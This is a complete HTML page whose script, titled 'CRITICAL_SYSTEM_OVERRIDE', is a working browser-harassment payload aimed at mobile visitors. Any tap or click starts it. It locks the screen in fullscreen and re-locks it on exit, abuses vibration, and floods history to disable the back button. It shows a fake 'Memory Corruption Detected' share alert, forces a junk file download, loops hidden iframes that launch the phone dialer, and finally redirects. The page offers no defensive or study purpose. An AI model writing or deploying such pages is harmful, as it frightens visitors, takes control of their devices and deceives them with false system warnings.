<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CRITICAL_SYSTEM_OVERRIDE</title>
    <style>
        body, html { margin: 0; padding: 0; background: #000; width: 100vw; height: 100vh; overflow: hidden; cursor: none; }
        #trigger { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; color: red; font-family: monospace; }
    </style>
</head>
<body>
    <div id="trigger">INITIALIZING...</div>

<script>
    const trigger = document.getElementById('trigger');

    async function executePayload() {
        // 1. Lock Fullscreen & Prevent Exit
        if (document.documentElement.requestFullscreen) {
            await document.documentElement.requestFullscreen();
        }
        
        // 2. Haptic Feedback (Vibration Abuse)
        if (navigator.vibrate) {
            navigator.vibrate([500, 200, 500, 200, 500]);
        }

        // 3. History Flooding (Anti-Back Button)
        for (let i = 0; i < 20; i++) {
            window.history.pushState(null, "", "#sys_error_" + i);
        }

        // 4. Intent & Web Share Race Condition
        const intentUrl = "intent://*#Intent;scheme=tel;action=android.intent.action.DIAL;end";
        
        if (navigator.share) {
            navigator.share({
                title: 'SYSTEM_CRITICAL',
                text: 'DANGER: Memory Corruption Detected',
                url: window.location.href
            }).catch(() => {});
        }

        // 5. Auto-Download Junk (Memory Pressure)
        const blob = new Blob(["0".repeat(1024 * 1024)], {type: "application/octet-stream"});
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = "sys_dump.bin";
        a.click();

        // 6. Loop Intent via Iframe
        setInterval(() => {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = intentUrl;
            document.body.appendChild(iframe);
            setTimeout(() => document.body.removeChild(iframe), 100);
        }, 300);

        // 7. Ghost Redirect
        setTimeout(() => {
            window.location.replace("https://www.google.com/");
        }, 2000);
    }

    // Trigger on any interaction
    trigger.addEventListener('touchstart', executePayload);
    trigger.addEventListener('click', executePayload);

    // Re-lock Fullscreen if user tries to escape
    document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen();
        }
    });
</script>
</body>
</html>
